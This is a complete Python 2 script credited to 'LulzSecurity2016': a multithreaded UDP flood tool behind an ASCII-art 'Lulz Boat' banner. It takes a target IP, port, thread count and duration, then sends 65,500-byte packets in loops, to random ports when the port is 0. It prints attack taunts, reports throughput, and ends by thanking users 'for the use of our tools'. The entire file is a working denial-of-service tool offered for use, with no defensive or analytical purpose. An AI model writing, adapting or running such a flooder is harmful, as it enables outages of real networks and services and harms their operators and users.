#!/usr/bin/python
#
# Ludpf.py
# 
#Coded by LulzSecurity2016	
# 

print"""

                _.--| LuLz|:                    
               <____|.----||                    
                      .---''---,                
   The                 ;..__..'    _...         
    Lulz            , '/  ||/..--''    \        
     Boat         ,'_ /'.-||            :       
      2016   _..-' ''/    ||  \    \   _|/|     
           \        /-._;/||   \    \,;'   \    
           ,\      /    /`||    \   //    `:`.  
         ,'  \    /-._;/  ||    : ::    ,.   . 
       ,'     \  /    /`-.||    | || ' :  `.`.)
    _,'        |;._: /|  ;||    | `|   :    `' 
  ,'   `.      /    /`-:_/||    |  |  : \      
  `--.   )    /'-._/    /:||       |   \ \     
     /  /    /'_  /;`-./_;||__..--';    : :    
    /  (    /  -./_  _/  .||'o |   /     ' |    
   /  , \._/_/_./--''/_  /||___|_,'      | |    
  :  /   `'-'--'----'---------'          / |    
  | :     O ._O   O_. O ._O   O_.       ; ;    
  : `.      //    //    //    //       /     
~~~`.______//____//____//____//_______ ,'~~     
          //    //~   //    // ~ ~ ~ ~~~~    
   ~~   _//   _//   _// ~ _//    ~  ~ ~ ~    
 ~     / /   / /   / /   / /  ~      ~~       
      ~~~   ~~~   ~~~   ~~~                   
                                   Setting Sail to the horizon. 
                                              Yours 
                                        lulzSecurity2016
                                           % |\| |\| %

"""

#import 
import os
import sys
import time
import socket
#import rawsocket
import random
from threading import Thread

#Main Config

#fd = rawsocket.rawsocket_fd()
#s=socket.fromfd(fd,socket.AF_PACKET,socket.SOCK_RAW)

ip=sys.argv[1]
port=int(sys.argv[2])
threads=int(sys.argv[3])
endtime=int(sys.argv[4])
def udp(ip,port,floodtime):
	global packets
	global threads
	global endtime
	packets=0
	data="\xFF"*65500
	while floodtime>=time.clock():
		s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		if port==0:
			randport=random.randrange(1,65500)
			s.sendto(data,(ip,randport))
			print "Base Under Ludp's attack Yours LulzSecurity2016"
		else:
			s.sendto(data,(ip,port))
		packets+=1
	print "Ludp's Thread "+str(threads)+" Stopping..."
	threads-=1
for i in xrange(0,threads):
	t=Thread(target=(udp),args=(ip,port,endtime))
	t.start()
time.sleep(endtime)
while threads>=1:
	print "Waiting for "+str(threads)+" Ludp's Threads to stop"
	time.sleep(1)
print "Ludp's Sent "+str(packets)+" packets, averaging at ~"+str(packets/16/endtime)+" MB/s!"

print "Thanx for the use of our tools"
print "yours LulzSecurity2016"
print "visit our base @ www.lulzsec.nl"

exit()
